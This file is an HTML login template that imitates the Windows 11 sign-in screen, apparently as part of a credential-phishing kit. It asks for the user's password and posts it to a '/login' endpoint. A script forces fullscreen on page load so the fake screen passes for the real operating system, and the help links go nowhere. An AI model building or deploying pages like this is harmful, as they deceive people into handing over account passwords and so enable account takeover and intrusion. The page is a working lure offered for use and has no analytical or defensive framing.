<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows 11 Login</title>
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-avatar">
            <img src="/static/images/avatar.png" alt="Avatar">
        </div>
        <h1>{{ username }}</h1>
        <form action="/login" method="POST" onsubmit="exitFullscreen()">
            <input type="hidden" name="username" value="{{ username }}">
            <div class="password-container">
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="password-submit">
                    <img src="/static/images/arrow.png" alt="Submit">
                </button>
            </div>
        </form>
        <div class="login-options">
            <a href="#">I forgot my password</a>
            <a href="#">Sign-in options</a>
        </div>
    </div>
    <div class="bottom-icons">
        <img src="/static/images/icon1.png" alt="Icon 1">
        <img src="/static/images/icon2.png" alt="Icon 2">
        <img src="/static/images/icon3.png" alt="Icon 3">
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if (document.fullscreenEnabled) {
                requestFullScreen(document.documentElement);
            }
        });

        function isInFullScreen() {
            const doc = document;
            return (doc.fullscreenElement && doc.fullscreenElement !== null) ||
                (doc.webkitFullscreenElement && doc.webkitFullscreenElement !== null) ||
                (doc.mozFullScreenElement && doc.mozFullScreenElement !== null) ||
                (doc.msFullscreenElement && doc.msFullscreenElement !== null);
        }

        function requestFullScreen(elem) {
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) {
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullScreen) {
                elem.webkitRequestFullScreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            } else {
                console.warn("Did not find a requestFullScreen method on this element", elem);
            }
        }

        function exitFullScreen() {
            const doc = document;
            if (doc.exitFullscreen) {
                doc.exitFullscreen();
            } else if (doc.webkitExitFullscreen) {
                doc.webkitExitFullscreen();
            } else if (doc.mozCancelFullScreen) {
                doc.mozCancelFullScreen();
            } else if (doc.msExitFullscreen) {
                doc.msExitFullscreen();
            }
        }

        function toggleFullScreen(elem) {
            if (isInFullScreen()) {
                exitFullScreen();
            } else {
                requestFullScreen(elem || document.body);
            }
        }
    </script>
</body>
</html>
